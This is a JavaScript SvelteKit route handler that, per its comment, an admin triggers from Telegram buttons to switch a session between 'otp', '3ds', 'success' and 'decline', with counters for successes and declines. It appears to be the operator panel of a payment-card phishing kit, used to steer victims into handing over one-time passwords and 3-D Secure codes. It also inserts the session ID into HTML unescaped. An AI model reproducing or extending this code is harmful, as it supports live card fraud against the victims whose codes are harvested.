import { setAction } from '$lib/sessions.js';
import { inc } from '$lib/stats.js';

/**
 * GET /api/set-mode?s=SESSION&a=ACTION
 * Actions: otp | 3ds | success | decline
 * Called by admin when clicking Telegram URL buttons.
 *
 * @type {import('./$types').RequestHandler}
 */
export function GET({ url }) {
  const sessionId = url.searchParams.get('s');
  const action = url.searchParams.get('a');

  if (!sessionId || !action) {
    return new Response('Missing params', { status: 400 });
  }

  const allowed = new Set(['otp', '3ds', 'success', 'decline']);
  if (!allowed.has(action)) {
    return new Response('Unknown action', { status: 400 });
  }

  setAction(sessionId, action);
  if (action === 'success') inc('successes');
  else if (action === 'decline') inc('declines');

  const labels = {
    otp: '🔑 OTP mode selected',
    '3ds': '🔗 3D Secure mode selected',
    success: '✅ Success',
    decline: '❌ Declined'
  };

  return new Response(
    `<!DOCTYPE html><html><body style="font-family:sans-serif;text-align:center;padding:60px;font-size:22px;background:#f6f6f6">
      <div style="background:#fff;padding:30px;border-radius:10px;display:inline-block;box-shadow:0 2px 10px rgba(0,0,0,.08)">
        ${labels[action]}
        <div style="margin-top:20px;font-size:14px;color:#888">Session: ${sessionId}</div>
      </div>
    </body></html>`,
    { headers: { 'Content-Type': 'text/html; charset=utf-8' } }
  );
}
